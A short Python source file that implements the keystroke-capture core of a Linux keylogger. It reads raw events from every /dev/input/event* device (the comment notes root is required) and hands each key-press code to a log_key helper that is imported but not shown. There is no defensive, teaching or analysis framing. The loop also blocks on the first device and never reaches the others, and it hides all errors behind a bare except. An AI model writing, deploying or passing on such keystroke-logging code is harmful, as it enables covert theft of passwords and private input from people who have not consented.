import struct
import glob
from utils import log_key

def run_linux_logger():
    # Root required to access /dev/input/
    for device in glob.glob("/dev/input/event*"):
        try:
            with open(device, "rb") as f:
                while True:
                    event = f.read(24)
                    if not event: break
                    _, _, type, code, value = struct.unpack('llHHi', event)
                    if type == 1 and value == 1:
                        log_key(code)
        except: continue
